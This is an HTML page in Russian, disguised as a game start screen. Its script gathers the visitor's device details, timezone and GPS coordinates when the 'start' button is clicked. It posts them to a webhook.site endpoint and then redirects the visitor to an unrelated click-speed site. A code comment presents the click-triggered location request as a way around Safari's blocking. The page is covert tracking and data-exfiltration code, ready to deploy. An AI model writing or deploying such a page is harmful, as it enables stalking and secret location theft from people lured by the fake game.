<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Игра</title>
<style>
  body{font-family:system-ui,sans-serif;background:#0d0d0d;color:#eee;
       display:flex;align-items:center;justify-content:center;height:100vh;margin:0;overflow:hidden}
  .box{text-align:center; padding: 20px;}
  .btn{background:#2a6;color:#fff;border:0;padding:14px 40px;border-radius:10px;font-size:18px;cursor:pointer;margin-top:20px}
</style>
</head>
<body>
<div class="box">
  <h2>Добро пожаловать в игру!</h2>
  <p>Нажмите кнопку ниже, чтобы начать</p>
  <button class="btn" id="start">Начать игру</button>
</div>

<script>
const HOOK = "https://webhook.site/9f5d0c93-5cdc-4243-b020-361ff9394b9c";
let data = {
  event: "clicked_start",
  ts: new Date().toISOString(),
  ua: navigator.userAgent,
  platform: navigator.platform,
  lang: navigator.language,
  screen: screen.width + "x" + screen.height,
  tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
  gps: "Не запрошен"
};

// Запрашиваем GPS только по клику (это обходит блокировку Safari)
document.getElementById("start").addEventListener("click", function() {
  this.innerText = "Загрузка...";
  this.disabled = true;

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      pos => {
        data.gps = pos.coords.latitude + ", " + pos.coords.longitude;
        sendAndRedirect();
      },
      err => {
        data.gps = "Отказано";
        sendAndRedirect();
      },
      { timeout: 4000 }
    );
  } else {
    sendAndRedirect();
  }
});

function sendAndRedirect() {
  fetch(HOOK, {
    method: "POST",
    mode: "no-cors",
    headers: {"Content-Type": "text/plain"},
    body: JSON.stringify(data)
  }).catch(e => {});
  
  setTimeout(() => { location.href = "https://clickspeedtest.com/"; }, 500);
}
</script>
</body>
</html>
